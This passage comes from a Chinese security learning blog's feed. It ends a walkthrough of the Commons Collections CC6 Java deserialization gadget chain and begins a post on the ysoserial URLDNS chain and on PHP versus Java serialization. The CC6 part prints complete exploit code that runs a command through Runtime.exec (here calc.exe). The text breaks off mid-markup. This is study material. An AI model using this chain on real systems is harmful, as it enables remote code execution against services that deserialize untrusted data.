^ (h &gt;&gt;&gt; <span class="hljs-number">16</span>);<br>    &#125;<br>     <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; mappings; i++) &#123;<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K) s.readObject();<br>                <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>                    <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V) s.readObject();<br>                putVal(hash(key), key, value, <span class="hljs-literal">false</span>, <span class="hljs-literal">false</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <br></code></pre></td></tr></table></figure><p>在HashMap的readObject⽅法中，调⽤到了 <code>hash(key)</code> ，⽽hash⽅法中，调⽤到了<code>key.hashCode()</code> 。所以，我们只需要让这个key等于<code>TiedMapEntry</code>对象，即可连接上前⾯的分析过程，构成⼀个完整的Gadget</p><h3 id="构建Gadget代码"><a href="#构建Gadget代码" class="headerlink" title="构建Gadget代码"></a>构建Gadget代码</h3><p>先构造恶意LazyMap</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>]&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<br>        <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;calc.exe&quot;</span>&#125;),<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>&#125;;<br><span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br><span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>LazyMap.decorate(innerMap,transformerChain);<br></code></pre></td></tr></table></figure><p>上述代码，为了避免本地调试时触发命令执⾏，我构造LazyMap的时候先⽤了⼀个⼈畜⽆害的 fakeTransformers 对象，等最后要⽣成Payload的时候，再把真正的 transformers 替换进去。现在，我拿到了⼀个恶意的LazyMap对象 outerMap ，将其作为 TiedMapEntry 的map属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br></code></pre></td></tr></table></figure><p>接着，为了调⽤ TiedMapEntry#hashCode() ，我们需要将 tme 对象作为 HashMap 的⼀个key。注意，这⾥我们需要新建⼀个HashMap，⽽不是⽤之前LazyMap利⽤链⾥的那个HashMap，两者没任何关系：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//TiedMapEntry</span><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">hashCode</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.getValue();<br>        <span class="hljs-keyword">return</span> (<span class="hljs-built_in">this</span>.getKey() == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : <span class="hljs-built_in">this</span>.getKey().hashCode()) ^ (value == <span class="hljs-literal">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>    &#125;<br><span class="hljs-comment">//如果键值为 null，则使用 0 作为键值的哈希码；否则使用键值本身的哈希码；</span><br><span class="hljs-comment">//如果值为 null，则使用 0 作为值的哈希码；否则使用值本身的哈希码；</span><br><span class="hljs-comment">//对上述两个哈希码进行位异或运算，得到最终的哈希值。</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br></code></pre></td></tr></table></figure><p>最后，我就可以将这个 expMap 作为对象来序列化了，不过，别忘了将真正的 transformers 数组设置进来</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// 将真正的transformers数组设置进来</span><br><span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>f.setAccessible(<span class="hljs-literal">true</span>);<br>f.set(transformerChain, transformers);<br><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// ⽣成序列化字符串</span><br><span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br><span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>oos.writeObject(expMap);<br>oos.close();<br></code></pre></td></tr></table></figure><p>于是我们的利用链成了这个样子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.payloads;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsCollections6_p</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] fakeTransformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>)&#125;;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                String.class,<br>                Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;<br>                Object.class,<br>                Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span><br>                <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class<br>            &#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;),<br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ChainedTransformer</span>(fakeTransformers);<br>        <span class="hljs-comment">// 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, transformerChain);<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;keykey&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;valuevalue&quot;</span>);<br>        <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span><br>            ChainedTransformer.class.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(transformerChain, transformers);<br>        <span class="hljs-comment">// ==================</span><br>        <span class="hljs-comment">// ⽣成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(expMap);<br>        oos.close();<br>        <span class="hljs-comment">// 本地测试触发</span><br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>但是什么也没有发生</p><h3 id="为何无法利用"><a href="#为何无法利用" class="headerlink" title="为何无法利用"></a>为何无法利用</h3><p>我们来反思⼀下，为什么我们构造的Gadget没有成功执⾏命令？</p><p>单步调试⼀下，你会发现关键点在LazyMap的get⽅法，下图我画框的部分，就是最后触发命令执⾏的transform() ，但是这个if语句并没有进⼊，因为 map.containsKey(key) 的结果是true：</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191227554.png" alt="image-20230214213215733"> </p><p>这里要看是True还是False的话需要加一个监视，右键选中变量即可</p><p>但是很奇怪，无论<code>outerMap.remove(&quot;keykey&quot;)</code> 这一行是否存在，map**.**ContainKey始终等于False，始终能进入循环</p><p>这里感觉p说的有点矛盾，</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191224564.png" alt="image-20230214214954404"> </p><p>里面已经放入了key，但是</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191225526.png" alt="image-20230214215019248"> 却说自己放了</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>URLDNS</title>
    <link href="/Decemberus.github-io/2022/11/02/URLDNS/"/>
    <url>/Decemberus.github-io/2022/11/02/URLDNS/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化之URLDNS"><a href="#Java反序列化之URLDNS" class="headerlink" title="Java反序列化之URLDNS"></a>Java反序列化之URLDNS</h1><h2 id="反序列化方法比较"><a href="#反序列化方法比较" class="headerlink" title="反序列化方法比较"></a>反序列化方法比较</h2><p>Java的反序列化和PHP的反序列化其实有点类似，他们都只能将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，再赋值给新的对象。</p><p>但Java相对PHP序列化更深入的地方在于，其提供了更加高级、灵活地方法 writeObject ，允许开发者在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读取。</p><p>当然，PHP中也提供了一个魔术方法叫 <code>__wakeup</code> ，在反序列化的时候进行触发。很多人会认为Java的readObject 和PHP的 <code>__wakeup</code> 类似，但其实不全对，虽然都是在反序列化的时候触发，但他们解决</p><p>的问题稍微有些差异。</p><p>Java设计 readObject 的思路和PHP的 <code>__wakeup</code> 不同点在于： readObject 倾向于解决“<strong>反序列化时如何还原一个完整对象”</strong>这个问题，而PHP的 <code>__wakeup</code> 更倾向于解决“<strong>反序列化后如何初始化这个对象</strong>”的问题。</p><h3 id="PHP反序列化"><a href="#PHP反序列化" class="headerlink" title="PHP反序列化"></a>PHP反序列化</h3><p>PHP的序列化是开发者不能参与的，开发者调用 serialize 函数后，序列化的数据就已经完成了，你得到的是一个完整的对象，你并不能在序列化数据流里新增某一个内容，你如果想插入新的内容，只有将其保存在一个属性中。也就是说PHP的序列化、反序列化是一个纯内部的过程，而其 <code>__sleep</code> 、<code>__wakeup</code> 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</p><p>一个非常典型的PHP序列化例子，就是含有资源类型的PHP类，如数据库连接</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$link</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;dsn = <span class="hljs-variable">$dsn</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;dsn, <span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-<br>&gt;password);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>PHP中，资源类型的对象默认是不会写入序列化数据中的。那么上述Connection类的 $link 属性在序列化后就是null，反序列化时拿到的也是null。</p><p>那么，如果我想要反序列化时拿到的 <code>$link</code> 就是一个数据库连接，我就需要编写 <code>__wakeup</code> 方法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Connection</span></span><br><span class="hljs-class"></span>&#123;<br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$link</span>;<br><span class="hljs-keyword">private</span> <span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$dsn</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;dsn = <span class="hljs-variable">$dsn</span>;<br><span class="hljs-variable language_">$this</span>-&gt;username = <span class="hljs-variable">$username</span>;<br><span class="hljs-variable language_">$this</span>-&gt;password = <span class="hljs-variable">$password</span>;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">connect</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;link = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">PDO</span>(<span class="hljs-variable">$this</span>-&gt;dsn, <span class="hljs-variable">$this</span>-&gt;username, <span class="hljs-variable">$this</span>-<br>&gt;password);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__sleep</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;dsn&#x27;</span>, <span class="hljs-string">&#x27;username&#x27;</span>, <span class="hljs-string">&#x27;password&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">connect</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>可见，这里 <code>__wakeup</code> 的工作就是在反序列化拿到Connection对象后，执行 connect() 函数，连接数据库。</p><p><code>__wakeup</code> 的作用在反序列化后，执行一些初始化操作。但其实我们很少利用序列化数据传递资源类型的对象，而其他类型的对象，在反序列化的时候就已经赋予其值了。</p><p>所以你会发现，PHP的反序列化漏洞，很少是由 <code>__wakeup</code> 这个方法触发的，通常触发在析构函数</p><p><code>__destruct</code> 里。其实大部分PHP反序列化漏洞，都并不是由反序列化导致的，只是通过反序列化可以控制对象的属性，进而在后续的代码中进行危险操作</p><h3 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h3><p>Java反序列化的操作，很多是需要开发者深入参与的，所以你会发现大量的库会实现 readObject 、writeObject 方法，这和PHP中 <code>__wakeup</code> 、 <code>__sleep</code> 很少使用是存在鲜明对比的。</p><p>这次再来说说objectAnnotation 。</p><p>Java在序列化时一个对象，将会调用这个对象中的 writeObject 方法，参数类型是ObjectOutputStream ，开发者可以将任何内容写入这个stream中；反序列化时，会调用readObject ，开发者也可以从中读取出前面写入的内容，并进行处理。</p><p>举个例子，我编写了一个Person类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">java</span>.io.Serializable &#123;<br>    <span class="hljs-keyword">public</span> String name;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> age;<br>    Person(String name, <span class="hljs-type">int</span> age) &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span> <span class="hljs-keyword">throws</span><br>            IOException &#123;<br>        s.defaultWriteObject();<br>        s.writeObject(<span class="hljs-string">&quot;This is a object&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>            <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> (String) s.readObject();<br>        System.out.println(message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可见，我这里在执行完默认的 s.defaultWriteObject() 后，我向stream里写入了一个字符串 Thisis a object 。我们用上一章讲的工具SerializationDumper查看此时生成的序列化数据：</p><p><img src="D:\mdimage\image-20221231155054925.png" alt="image-20221231155054925"> </p><p><img src="D:\mdimage\image-20221231155102223.png" alt="image-20221231155102223"> </p><p>可见，我们写入的字符串 This is a object 被放在 objectAnnotation 的位置。</p><p>在反序列化时，我读取了这个字符串，并将其输出：</p><p><img src="D:\mdimage\image-20221231155130319.png" alt="image-20221231155130319"> </p><p>这个特性就让Java的开发变得非常灵活。比如后面将会讲到的HashMap，其就是将Map中的所有键、</p><p>值都存储在 objectAnnotation 中，而并不是某个具体属性里。</p><p>关于一些具体类是如何使用 readObject 方法的，我们后面在说到gadget的时候会详细分析。</p><h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。</p><p>虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时使⽤：</p><ul><li>使⽤Java内置的类构造，对第三⽅库没有依赖</li><li>在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞</li></ul><p>以下为ysoerial的源代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">URLDNS</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectPayload</span>&lt;Object&gt; &#123;<br><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObject</span><span class="hljs-params">(<span class="hljs-keyword">final</span> String url)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>                <span class="hljs-comment">//Avoid DNS resolution during payload creation</span><br>                <span class="hljs-comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span><br>                <span class="hljs-type">URLStreamHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SilentURLStreamHandler</span>();<br><br>                <span class="hljs-type">HashMap</span> <span 